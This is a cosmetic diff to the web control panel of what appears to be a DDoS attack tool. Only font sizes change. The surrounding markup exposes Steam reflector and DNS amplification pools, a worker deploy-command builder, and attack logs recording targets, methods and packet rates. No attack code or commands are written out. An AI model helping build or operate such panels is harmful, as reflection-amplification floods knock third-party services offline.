-        <div style="margin-top:6px;color:var(--text);font-size:10px" x-text="t('cldap_export_tip')"></div>
+        <div style="margin-top:6px;color:var(--text);font-size:12px" x-text="t('cldap_export_tip')"></div>
       </div>
     </details>
   </div>
@@ -629,12 +634,12 @@
             <button class="btn" @click="checkUpdateVersion()" :disabled="updateChecking" x-text="updateChecking ? t('scanning') : t('update_check_btn')" style="flex:0;white-space:nowrap"></button>
           </div>
           <!-- GitHub Token 配置（认证后速率 5000/h + 版本列表） -->
-          <div style="display:flex;gap:6px;margin-bottom:6px;align-items:center;font-size:11px">
+          <div style="display:flex;gap:6px;margin-bottom:6px;align-items:center;font-size:12px">
             <input x-model="githubToken" type="password" :placeholder="t('gh_token_ph')" style="flex:1;margin-bottom:0">
             <button class="btn sm" @click="saveGithubToken()" x-text="t('save')" style="flex:0;white-space:nowrap"></button>
           </div>
           <!-- 版本选择（releases 列表） -->
-          <div x-show="updateCheckResult && updateCheckResult.releases && updateCheckResult.releases.length > 0" style="display:flex;gap:6px;margin-bottom:6px;align-items:center;font-size:11px">
+          <div x-show="updateCheckResult && updateCheckResult.releases && updateCheckResult.releases.length > 0" style="display:flex;gap:6px;margin-bottom:6px;align-items:center;font-size:12px">
             <select x-model="updateVersionSel" @change="checkUpdateVersion(true)" style="flex:1;margin:0">
               <option value="" x-text="t('update_latest')"></option>
               <template x-for="rel in updateCheckResult.releases" :key="rel.version">
@@ -642,7 +647,7 @@
               </template>
             </select>
           </div>
-          <div x-show="updateCheckResult" style="font-size:11px;margin-bottom:8px;padding:6px;background:var(--border);border-radius:4px">
+          <div x-show="updateCheckResult" style="font-size:12px;margin-bottom:8px;padding:6px;background:var(--border);border-radius:4px">
             <div style="margin-bottom:4px">
               <span style="opacity:0.7" x-text="t('update_current') + ': '"></span><span x-text="updateCheckResult.current_version"></span>
               <span x-show="updateCheckResult.latest_version" style="opacity:0.7"> → </span>
@@ -657,29 +662,29 @@
               <button x-show="updateCheckResult.has_update" class="btn" @click="updateWorkers()" :disabled="updateApplying" x-text="t('update_workers_btn')"></button>
             </div>
           </div>
-          <div x-show="!updateCheckResult && !updateChecking" style="font-size:10px;color:var(--text);opacity:0.6;margin-bottom:8px" x-text="t('update_check_tip')"></div>
+          <div x-show="!updateCheckResult && !updateChecking" style="font-size:12px;color:var(--text);opacity:0.6;margin-bottom:8px" x-text="t('update_check_tip')"></div>
           <h2 style="margin-bottom:8px" x-text="t('quick_deploy')"></h2>
           <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center">
             <input x-model="deployStorage" :placeholder="t('deploy_storage_ph')" style="flex:1;margin-bottom:0">
             <button class="btn" @click="saveDeploy()" x-text="t('save')" style="flex:0;white-space:nowrap"></button>
           </div>
-          <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center;font-size:11px">
+          <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center;font-size:12px">
             <span style="opacity:0.7" x-text="t('deploy_grpc_port')"></span>
             <input x-model="deployGrpcPort" @input="deployGrpcPortInput()" placeholder="auto" style="width:70px;margin-bottom:0">
             <span style="opacity:0.5" x-text="t('deploy_grpc_port_hint')"></span>
           </div>
-          <div style="display:flex;flex-direction:column;gap:6px;font-size:11px;margin-bottom:8px">
+          <div style="display:flex;flex-direction:column;gap:6px;font-size:12px;margin-bottom:8px">
             <label class="deploy-opt"><input type="checkbox" x-model="deployProxy" @change="buildDeployCmd()"> <span x-text="t('deploy_proxy')"></span></label>
             <label class="deploy-opt"><input type="checkbox" x-model="deployInstall" @change="toggleInstall()"> <span x-text="t('deploy_install')"></span></label>
             <label class="deploy-opt"><input type="checkbox" x-model="deployDaemon" @change="buildDeployCmd()"> <span x-text="t('deploy_daemon')"></span></label>
           </div>
           <div style="display:flex;gap:6px;align-items:center;margin-top:6px">
-            <label class="deploy-opt" style="font-size:11px"><input type="radio" value="curl" x-model="deployTool" @change="buildDeployCmd()"> curl</label>
-            <label class="deploy-opt" style="font-size:11px"><input type="radio" value="wget" x-model="deployTool" @change="buildDeployCmd()"> wget</label>
+            <label class="deploy-opt" style="font-size:12px"><input type="radio" value="curl" x-model="deployTool" @change="buildDeployCmd()"> curl</label>
+            <label class="deploy-opt" style="font-size:12px"><input type="radio" value="wget" x-model="deployTool" @change="buildDeployCmd()"> wget</label>
             <button class="btn" @click="copyDeployCmd()" style="flex:0;white-space:nowrap;margin-left:auto" x-text="t('copy')"></button>
           </div>
           <div class="worker-cmd" style="margin-top:6px;min-height:32px" x-text="deployCmd || t('deploy_cmd_empty')"></div>
-          <div style="margin-top:8px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="t('deploy_tip')"></div>
+          <div style="margin-top:8px;font-size:12px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="t('deploy_tip')"></div>
           <div style="border-top:1px solid var(--border);margin:10px 0 8px"></div>
           <h3 style="font-size:12px;margin-bottom:6px" x-text="t('update_worker')"></h3>
           <div style="display:flex;gap:6px;margin-bottom:6px;align-items:center">
@@ -690,13 +695,13 @@
             <button class="btn" @click="saveUpdate()" x-text="t('update_push')" style="flex:1"></button>
             <button class="btn" @click="clearUpdate()" x-text="t('update_clear')" style="flex:0;white-space:nowrap"></button>
           </div>
-          <div style="margin-top:6px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="updateStatus || t('update_tip')"></div>
+          <div style="margin-top:6px;font-size:12px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="updateStatus || t('update_tip')"></div>
 
           <div style="border-top:1px solid var(--border);margin:10px 0 8px"></div>
           <h3 style="font-size:12px;margin-bottom:6px" x-text="t('migrate_title')"></h3>
-          <div style="font-size:10px;color:var(--yellow);border:1px solid var(--yellow);border-radius:4px;padding:5px 8px;margin-bottom:6px;opacity:0.9" x-text="t('migrate_beta')"></div>
-          <div x-show="migrateMsg" style="font-size:11px;margin-bottom:6px;color:var(--cyan);white-space:pre-line" x-text="migrateMsg"></div>
-          <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:8px;font-size:11px">
+          <div style="font-size:12px;color:var(--yellow);border:1px solid var(--yellow);border-radius:4px;padding:5px 8px;margin-bottom:6px;opacity:0.9" x-text="t('migrate_beta')"></div>
+          <div x-show="migrateMsg" style="font-size:12px;margin-bottom:6px;color:var(--cyan);white-space:pre-line" x-text="migrateMsg"></div>
+          <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:8px;font-size:12px">
             <input x-model="migrateHTTP" :placeholder="t('migrate_http_ph')" style="margin:0">
             <input x-model="migrateAdminToken" :placeholder="t('migrate_admin_ph')" style="margin:0">
             <input x-model="migrateGRPC" :placeholder="t('migrate_grpc_ph')" style="margin:0">
@@ -705,7 +710,7 @@
             <button class="btn" @click="startMigrate()" :disabled="migrating" style="flex:1" x-text="migrating ? t('migrating') : t('migrate_start')"></button>
             <button class="btn" @click="stopMigrate()" :disabled="!migrateMode" x-text="t('migrate_stop')" style="flex:0;white-space:nowrap"></button>
           </div>
-          <div style="margin-top:6px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="t('migrate_tip')"></div>
+          <div style="margin-top:6px;font-size:12px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="t('migrate_tip')"></div>
         </div>
       </div>
     </div>
@@ -718,7 +723,7 @@
       <input x-model="dnsAmpDomain" placeholder="amp.your-domain.com" style="flex:1">
       <button class="btn" @click="saveDNSAmp()" x-text="t('save')"></button>
     </div>
-    <div style="font-size:11px;color:var(--text);opacity:0.6;margin-top:4px" x-text="t('dns_amp_hint')"></div>
+    <div style="font-size:12px;color:var(--text);opacity:0.6;margin-top:4px" x-text="t('dns_amp_hint')"></div>
   </div>
 
   <!-- Steam Reflector Pool -->
@@ -727,8 +732,8 @@
     <div style="display:flex;gap:8px;margin-bottom:8px">
       <button class="btn" @click="steamRefresh()" :disabled="steamScanning" x-text="steamScanning ? t('scanning') : t('force_refresh')"></button>
     </div>
-    <div x-show="steamStatus" style="font-size:11px;margin-bottom:6px;color:var(--cyan)" x-text="steamStatus"></div>
-    <div style="max-height:200px;overflow-y:auto;font-size:11px">
+    <div x-show="steamStatus" style="font-size:12px;margin-bottom:6px;color:var(--cyan)" x-text="steamStatus"></div>
+    <div style="max-height:200px;overflow-y:auto;font-size:12px">
       <template x-for="r in steamList.slice(0, 100)" :key="r.ip + ':' + r.port">
         <div class="log-line" style="padding:3px 0">
           <span style="color:var(--green)" x-text="r.ip + ':' + r.port"></span>
@@ -745,11 +750,11 @@
     <h2 x-text="t('manual_pool') + ' (' + manualCount + ')'"></h2>
     <div style="display:flex;gap:8px;margin-bottom:8px">
       <button class="btn sm" @click="manualTest()" :disabled="manualTesting" x-text="manualTesting ? t('testing') : t('test_clean')"></button>
-      <input x-model="manualAddText" :placeholder="t('manual_add_placeholder')" style="flex:1;margin:0;font-size:11px">
+      <input x-model="manualAddText" :placeholder="t('manual_add_placeholder')" style="flex:1;margin:0;font-size:12px">
       <button class="btn sm" @click="manualAdd()" x-text="t('add')"></button>
     </div>
-    <div x-show="manualStatus" style="font-size:11px;margin-bottom:6px;color:var(--cyan)" x-text="manualStatus"></div>
-    <div style="max-height:200px;overflow-y:auto;font-size:11px">
+    <div x-show="manualStatus" style="font-size:12px;margin-bottom:6px;color:var(--cyan)" x-text="manualStatus"></div>
+    <div style="max-height:200px;overflow-y:auto;font-size:12px">
       <template x-for="r in manualList.slice(0, 100)" :key="r.ip + ':' + r.port">
         <div class="log-line" style="padding:3px 0">
           <span :style="'color:' + (r.last_tested && !r.last_valid ? 'var(--red)' : 'var(--green)')">
@@ -794,7 +799,7 @@
       <div class="stat-card" style="flex:2;min-width:220px">
         <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
           <template x-for="b in (logStats.by_method||[]).slice(0,5)" :key="b.key">
-            <span style="font-size:10px;opacity:0.8" x-text="b.key + ' ×' + b.count" :title="'packets: ' + formatNum(b.packets)"></span>
+            <span style="font-size:12px;opacity:0.8" x-text="b.key + ' ×' + b.count" :title="'packets: ' + formatNum(b.packets)"></span>
           </template>
         </div>
         <div class="label" x-text="t('st_by_method')"></div>
@@ -819,9 +824,9 @@
         <tbody>
           <template x-for="l in logs" :key="l.id">
             <tr>
-              <td style="font-size:10px" x-text="new Date(l.start_time*1000).toLocaleString().slice(0,16)"></td>
-              <td style="font-size:10px;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" x-text="l.target"></td>
-              <td style="font-size:10px" x-text="l.method"></td>
+              <td style="font-size:12px" x-text="new Date(l.start_time*1000).toLocaleString().slice(0,16)"></td>
+              <td style="font-size:12px;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" x-text="l.target"></td>
+              <td style="font-size:12px" x-text="l.method"></td>
               <td x-text="l.worker_count"></td>
               <td x-text="formatNum(l.total_packets)"></td>
               <td x-text="formatNum(l.peak_pps)"></td>
@@ -862,16 +867,16 @@
         <tbody>
           <template x-for="a in auditLogs" :key="a.time + a.action + a.detail">
             <tr>
-              <td style="font-size:10px" x-text="new Date(a.time*1000).toLocaleString().slice(0,16)"></td>
-              <td style="font-size:10px" x-text="a.role"></td>
-              <td style="font-size:10px;opacity:0.7" x-text="a.token_id"></td>
-              <td style="font-size:10px;color:var(--cyan)" x-text="a.action"></td>
-              <td style="font-size:10px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" x-text="a.detail"></td>
+              <td style="font-size:12px" x-text="new Date(a.time*1000).toLocaleString().slice(0,16)"></td>
+              <td style="font-size:12px" x-text="a.role"></td>
+              <td style="font-size:12px;opacity:0.7" x-text="a.token_id"></td>
+              <td style="font-size:12px;color:var(--cyan)" x-text="a.action"></td>
+              <td style="font-size:12px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" x-text="a.detail"></td>
             </tr>
           </template>
         </tbody>
       </table>
-      <div x-show="!auditLogs.length" style="padding:12px;text-align:center;opacity:0.5;font-size:11px">—</div>
+      <div x-show="!auditLogs.length" style="padding:12px;text-align:center;opacity:0.5;font-size:12px">—</div>
     </div>
   </div>
 </div>
